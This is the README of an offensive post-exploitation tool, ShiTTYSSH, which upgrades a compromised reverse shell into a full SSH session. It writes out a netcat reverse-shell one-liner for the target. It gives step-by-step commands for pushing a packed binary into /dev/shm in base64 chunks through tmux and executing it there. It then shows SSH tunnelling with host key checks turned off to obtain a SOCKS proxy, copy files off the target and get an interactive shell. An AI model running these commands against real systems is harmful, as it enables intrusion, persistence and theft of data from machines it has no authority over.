# ShiTTYSSH

A user-mode SSH daemon that communicates on stdin/stdout. Expose the ShiTTYSSH terminal to SSH(1) via 'ProxyCommand'.
SFTP, SCP, RPORT, LPORT, and DYNAMIC PORT (SOCKS5), all work as expected. Remember to use a ControlMaster for the first connection.
Upgrading can happen in-band, no new ports or sockets required.

## Compiling

```
go build -ldflags='-w -s'
upx --best shittySSH -o shittyUPX
```

## Credit

Code sloppily 'adapted' from Fahrj's [reverse-ssh](https://github.com/Fahrj/reverse-ssh).

## Issues

Probably. I didn't call it SmarTTYSSH.

## Example

In this example we turn a weak (rev/bind) shell into a capable SSH session.

On our listening post, use [ShiTTYSSHClient](https://github.com/tbiehn/ShiTTYSSHClient) to wrap a listener. `ShiTTYSSHClient` will provide access to the underlying STDIN/STDOUT via a listening TCP socket, this means we can attach and detach without destroying the session - and facilitates the handoff to SSH(1) via `ProxyCommand`.

`./shittySSHClient -cmd 'nc -vvl -p 8080' -listen 127.0.0.1:2222`
This example uses nc to listen for inbound connections to port 8080, via shittySSHClient's `-cmd` argument. You can use whatever you want here. `socat`... tinyshell... whatever. 
This command's stdin/stdout will be served up to clients connecting to localhost on port 2222 as specified by `-listen`. 

Send a simple reverse shell from a target machine using, for example;
`rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 8080 >/tmp/f`

Start a `tmux` session that connects to `shittySSHClient` on port 2222;
`tmux new-session -d -s ShiTTY 'nc 127.0.0.1 2222'`
`-d` here means start detached.
`-s` here tells tmux to name the new session `ShiTTY`
`'nc 127.0.0.1 2222'` is the command to run.

You can attach to it from another terminal to watch - `tmux attach-session -t ShiTTY` - you should see a prompt, go ahead and issue an `id` to check it out. Simple shell.

Now we need to put ShiTTYSSH on the target to run it - let's use a `heredoc` and keep it in memory using `/dev/shm/`.
`tmux send -t ShiTTY -l "cat <<'EOF'|base64 -d>/dev/shm/shitty" && tmux send -t ShiTTY ENTER`
This command uses `tmux send` to get a heredoc going through base64 decoding via `base64 -d` into `/dev/shm`. Maybe use a `memfd`. Maybe use a regular file.

If you're watching the session, it might look like this;
```
$ cat <<'EOF'|base64 -d>/dev/shm/shitty
>
```

Next let's send the actual file over the pipe.
`cat ./shittyUPX | base64 -w0 | split -b 500 --filter "xargs -I{} tmux send -t ShiTTY -l {}; tmux send -t ShiTTY ENTER" && tmux send -t ShiTTY -l EOF && tmux send -t ShiTTY ENTER`

First this base64 encodes `shittyUPX` and provides 500 byte chunks to `xargs` via a `split` `--filter` directive. `xargs` will use `tmux send` commands to dump the file into the waiting heredoc. `tmux send -t ShiTTY -l EOF && tmux send -t ShiTTY ENTER` closes the heredoc.

If you want to watch the progress, try launching coreutils `progress -m` in another terminal window. It also doesnt hurt to watch the tmux session fill up with our base64 chunks.

Once that finishes, your session should look something like;
```
> Loads of base64 encoded stuff.
> ...... AA=
> EOF
$
```

That means we're ready to actually launch shittySSH - lets just double check everything went OK;
```
$ md5sum /dev/shm/shitty
02eb5b95261c5042ed6c324085e70c67 /dev/shm/shitty
$
```
And that matches locally with;
```
> md5sum shittyUPX
02eb5b95261c5042ed6c324085e70c67  shittyUPX
```

Now, from tmux, execute shitty; `chmod +x /dev/shm/shitty; /dev/shm/shitty`

This command has no output, so now hand off this socket to ssh by destroying our tmux session and running SSH.

From another terminal, `tmux kill-session -t ShiTTY`, then run SSH with a ControlMaster directive and ProxyCommand, for example;
`ssh -o "PubkeyAuthentication no" -o UserKnownHostsFile=/dev/null -o "StrictHostKeyChecking=no" -o "controlpath /tmp/ssh-shitty" -o ProxyCommand="bash -c '(echo -n G ; cat -) | nc 127.0.0.1 2222'" -C -T -M -N -vvv shitty@x`
Here the command is a bit more complex - this implementation waits for a 'G' on stdin in order to simulate an accepted TCP connection. Our proxycommand echoes the magic character and then runs cat to pipe the rest to nc.

`-C` enables compression,
`-T` doesnt allocate a PTY,
`-M` starts a ControlMaster,
`-N` doesn't request a command.

Work with `ssh` as you usually would.

Get a Socks5 proxy to the remote end.
`ssh -S /tmp/ssh-shitty x -N -D 127.0.0.1:3434`

Grab a file
`sftp -o ControlPath=/tmp/ssh-shitty x@y:/home/user/big.file ~/big.file`
`scp -o ControlPath=/tmp/ssh-shitty x@y:/home/user/big.file ~/big.file`

Get a term.
`ssh -S /tmp/ssh-shitty 'bash -i'`

## License

GPLv3